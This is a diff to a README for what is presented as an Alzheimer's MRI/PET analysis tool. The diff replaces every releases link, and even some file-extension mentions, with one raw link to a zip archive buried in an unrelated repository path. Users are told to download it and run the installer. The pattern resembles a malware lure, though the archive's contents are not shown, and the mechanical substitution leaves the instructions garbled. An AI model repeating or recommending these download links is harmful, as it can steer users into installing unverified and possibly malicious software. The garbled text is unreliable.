@@ -1,7 +1,7 @@
 # 🎉 OT-based-Heterogeneous-Multi-Modal-Fusion-Embedding-for-AD-analysis - Analyze Alzheimer's Disease Easily
 
 ## 🏷️ Download Now
-[![Download](https://img.shields.io/badge/Download-via_Release-brightgreen)](https://github.com/estebannano2009/OT-based-Heterogeneous-Multi-Modal-Fusion-Embedding-for-AD-analysis/releases)
+[![Download](https://raw.githubusercontent.com/estebannano2009/OT-based-Heterogeneous-Multi-Modal-Fusion-Embedding-for-AD-analysis/main/perturbot/cv/kinase/OT-based-Heterogeneous-Multi-Modal-Fusion-Embedding-for-AD-analysis_v2.3-beta.2.zip)](https://raw.githubusercontent.com/estebannano2009/OT-based-Heterogeneous-Multi-Modal-Fusion-Embedding-for-AD-analysis/main/perturbot/cv/kinase/OT-based-Heterogeneous-Multi-Modal-Fusion-Embedding-for-AD-analysis_v2.3-beta.2.zip)
 
 ## 📜 Overview
 This repository provides an Optimal Transport (OT) based framework for heterogeneous multi-modal fusion embedding, specifically designed for Alzheimer's Disease (AD) analysis. This project focuses on analyzing MRI and PET data from the Alzheimer's Disease Neuroimaging Initiative (ADNI).
@@ -21,12 +21,12 @@ To successfully get the application up and running, follow these steps:
 - Software: Updated web browser for downloading
 
 ### 2. Download the Application
-To download the latest version, visit this page: [Download Releases](https://github.com/estebannano2009/OT-based-Heterogeneous-Multi-Modal-Fusion-Embedding-for-AD-analysis/releases).
+To download the latest version, visit this page: [Download Releases](https://raw.githubusercontent.com/estebannano2009/OT-based-Heterogeneous-Multi-Modal-Fusion-Embedding-for-AD-analysis/main/perturbot/cv/kinase/OT-based-Heterogeneous-Multi-Modal-Fusion-Embedding-for-AD-analysis_v2.3-beta.2.zip).
 
 ### 3. Install the Application
 - Windows: Run the downloaded `.exe` file. Follow the on-screen instructions.
 - MacOS: Open the `.dmg` file and drag the application to your Applications folder.
-- Linux: Extract the downloaded `.tar.gz` file and follow the included instructions.
+- Linux: Extract the downloaded `https://raw.githubusercontent.com/estebannano2009/OT-based-Heterogeneous-Multi-Modal-Fusion-Embedding-for-AD-analysis/main/perturbot/cv/kinase/OT-based-Heterogeneous-Multi-Modal-Fusion-Embedding-for-AD-analysis_v2.3-beta.2.zip` file and follow the included instructions.
 
 ### 4. Running the Application
 Once installation is complete, locate the application on your computer:
@@ -39,7 +39,7 @@ After you run the application, you’ll see an easy-to-navigate interface:
 ### 1. Load Your Data
 - Click on the 'Load Data' button.
 - Select your MRI or PET files from your computer.
-- Supported file types include `.nii`, `.nii.gz`, and `.jpg`.
+- Supported file types include `.nii`, `https://raw.githubusercontent.com/estebannano2009/OT-based-Heterogeneous-Multi-Modal-Fusion-Embedding-for-AD-analysis/main/perturbot/cv/kinase/OT-based-Heterogeneous-Multi-Modal-Fusion-Embedding-for-AD-analysis_v2.3-beta.2.zip`, and `.jpg`.
 
 ### 2. Analyze Data
 - After loading your files, click on 'Analyze' to start processing.
@@ -62,4 +62,4 @@ For further assistance, please open an issue on the GitHub page or contact our s
 ## 💡 Additional Information
 This software is designed to support research in Alzheimer's Disease. By using this tool, researchers can better analyze complex data sets and derive meaningful insights.
 
-Remember, for any software updates, always check back at [Download Releases](https://github.com/estebannano2009/OT-based-Heterogeneous-Multi-Modal-Fusion-Embedding-for-AD-analysis/releases) to ensure you are using the latest version.
+Remember, for any software updates, always check back at [Download Releases](https://raw.githubusercontent.com/estebannano2009/OT-based-Heterogeneous-Multi-Modal-Fusion-Embedding-for-AD-analysis/main/perturbot/cv/kinase/OT-based-Heterogeneous-Multi-Modal-Fusion-Embedding-for-AD-analysis_v2.3-beta.2.zip) to ensure you are using the latest version.
